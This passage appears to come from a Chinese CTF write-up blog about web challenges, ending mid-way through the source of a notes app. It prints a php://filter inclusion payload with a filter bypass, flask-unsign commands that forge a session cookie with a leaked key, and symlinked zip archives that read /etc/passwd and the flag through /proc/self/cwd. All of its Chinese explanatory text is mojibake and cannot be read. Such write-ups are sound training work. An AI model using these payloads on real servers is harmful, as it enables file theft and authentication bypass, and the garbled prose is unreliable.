class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gtfly123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>adm1n<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">accounts</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç™»å½•åçš„é¡µé¢ï¼ŒURLå¾ˆå¯ç–‘(å·¦ä¸‹è§’é‚£ä¸ªbase64è§£ç æ˜¯<code>flag is in /flag</code>)</p><p><img src="/img/ezloginwhat1.png" alt="ezloginwhat1"></p><p>è¿™ä¸ªURLå¾ˆå®¹æ˜“æƒ³åˆ°æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥ä¼ªåè®®è¯»<code>/flag</code>ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><p>å›æ˜¾<code>nonono</code>ã€‚ä¸€å¼€å§‹è¿˜ä»¥ä¸ºbanäº†<code>filter</code>æˆ–<code>flag</code>è¿™ç§å…³é”®å­—ï¼Œæƒ³ç€inputæ‰§è¡Œå‘½ä»¤ç»“æœè¿˜æ˜¯<code>nonono</code>ã€‚åé¢çœ‹äº†wpè¯´è¿‡æ»¤äº†phpğŸ¤¦â€å¤§å†™å…¶ä¸­æŸä¸ªå­—æ¯ç»•è¿‡å³å¯ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=pHp:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure><h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>ç™»å½•åæ˜¯ä¸ªä¸Šä¼ ç•Œé¢ï¼Œæ²¡æœ‰æ³¨å…¥å•¥çš„ï¼š</p><p><img src="/img/spwuctfwweb31.png" alt="spwuctfwweb31"></p><p>è¿™é‡Œç‚¹ä¸Šä¼ ä¼šå›æ˜¾<code>permission deied</code>ï¼Œä»–è¿™ä¸ªåº”è¯¥æ˜¯æŠŠèº«ä»½è—<code>cookie</code>é‡Œäº†ï¼ŒæŠ“åŒ…çœ‹äº†æ„Ÿè§‰åƒæ˜¯<code>JWT</code>ï¼Œè¯•è¯•(è¿™é‡Œåé¢åˆä»¥adminç™»å½•çš„ï¼Œè¿˜æ˜¯ä¼šæç¤ºæƒé™ä¸å¤Ÿ)ï¼š</p><p><img src="/img/spwuctfwweb32.png" alt="spwuctfwweb32"></p><p>è¿™é‡Œä¼°è®¡å’Œè¿™ä¸ªIDå­—æ®µæœ‰å…³ç³»ï¼Œä½†ä¸çŸ¥é“<code>secretkey</code>æ²¡æ³•å¼„ã€‚åé¢çœ‹äº†<code>wp</code>è¯´è¿™ä¸œè¥¿åœ¨è®¿é—®ä¸å­˜åœ¨çš„ç›®å½•æ—¶ï¼Œä¼šå‡ºç°åœ¨è¯·æ±‚å¤´å½“ä¸­ï¼š</p><p><img src="/img/spwuctfwweb33.png" alt="spwuctfwweb33"></p><blockquote><p>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p></blockquote><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">flask-unsign</span> <span class="hljs-built_in">--unsign</span> <span class="hljs-built_in">--decode</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiYWFhIiwidXNlcm5hbWUiOiJhYWEifQ.Zd0_yQ.qchBTpcAF1Zy3aeWFbnOsK8xLZg&quot;</span> <span class="hljs-built_in">--secret</span> <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> <span class="hljs-built_in">--no-literal-eval</span><br><br><span class="hljs-string">flask-unsign</span> <span class="hljs-built_in">--sign</span> <span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;aaa&#x27;, &#x27;username&#x27;: &#x27;aaa&#x27;&#125;</span><br><span class="hljs-string">&quot;</span> <span class="hljs-built_in">--secret</span> <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> <span class="hljs-built_in">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>ç™»å½•å®Œå‘ç°æ˜¯ç»™äº†æºç çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template_string(temp)<br>    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:<br>        m = hashlib.md5()<br>        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span><br>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        m.update(name)<br>        md5_one= m.hexdigest()<br>        n = hashlib.md5()<br>        ip = request.remote_addr<br>        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        n.update(ip)<br>        md5_ip = n.hexdigest()<br>        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        basepath=os.path.dirname(os.path.realpath(__file__))<br>        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span><br>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span><br>        filename = f.filename<br>        pathname = path+filename<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path_base)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(path)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):<br>            <span class="hljs-keyword">try</span>:<br>                f.save(pathname)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname<br>            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>: <span class="hljs-comment">#è¿™é‡Œé™åˆ¶äº†ä¸èƒ½åˆ©ç”¨systemåŒæ—¶æ‰§è¡Œå¤šæ¡å‘½ä»¤</span><br>waf()<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            os.system(cmd)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)<br>        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:<br>                shutil.rmtree(path_base)<br>                os.mkdir(path_base)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>            resp = make_response(image)<br>            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>            <span class="hljs-keyword">return</span> resp<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            shutil.rmtree(path_base)<br>            os.mkdir(path_base)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)  </span><span class="hljs-comment">#è¿™ä¸ªè·¯ç”±å°±æ˜¯å‘Šè¯‰äº†flagåœ¨å“ª</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">showflag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:<br>        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read() <span class="hljs-comment">#proc/self/cwdä»£æ›¿å½“å‰ç›®å½•</span><br>        resp = make_response(image)<br>        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span><br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯<code>/upload</code>è·¯ç”±çš„ååŠéƒ¨åˆ†ï¼šå…ˆæŠŠä¸Šä¼ çš„å‹ç¼©åŒ…è§£å‹äº†ç„¶åå»è¯»å–è§£å‹åçš„å›¾ç‰‡å†…å®¹ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">ln -sæ˜¯Linuxçš„ä¸€ç§è½¯è¿æ¥,ç±»ä¼¼ä¸windowsçš„å¿«æ·æ–¹å¼<br>ln -s <span class="hljs-regexp">/etc/</span>passwd forever404 è¿™ä¼šå‡ºç°ä¸€ä¸ªforever404æ–‡æœ¬,é‡Œé¢åŒ…å«å¯†ç <br><span class="hljs-regexp">/proc/</span>self è®°å½•äº†ç³»ç»Ÿè¿è¡Œçš„ä¿¡æ¯çŠ¶æ€ç­‰,cwd æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥,å³flaskè¿è¡Œè¿›ç¨‹ç›®å½•<br><br>ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg test<br>zip -ry test.zip test<br>-rï¼šè¡¨ç¤ºé€’å½’åœ°åŒ…å«æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ã€‚<br>-yï¼šè¡¨ç¤ºå°†ç¬¦å·é“¾æ¥ï¼ˆsymbolic linksï¼‰ä½œä¸ºç¬¦å·é“¾æ¥ä¿å­˜ï¼Œè€Œä¸è§£å¼•ç”¨å®ƒä»¬ã€‚è¿™é€šå¸¸ç”¨äºåœ¨ ZIP æ–‡ä»¶ä¸­ä¿ç•™ç¬¦å·é“¾æ¥çš„åŸå§‹çŠ¶æ€<br></code></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-notes"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-notes" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes</h2><p>ç»™äº†æºç ï¼Œå®ç°è®°ç¬”è®°çš„åŠŸèƒ½ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123;<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free 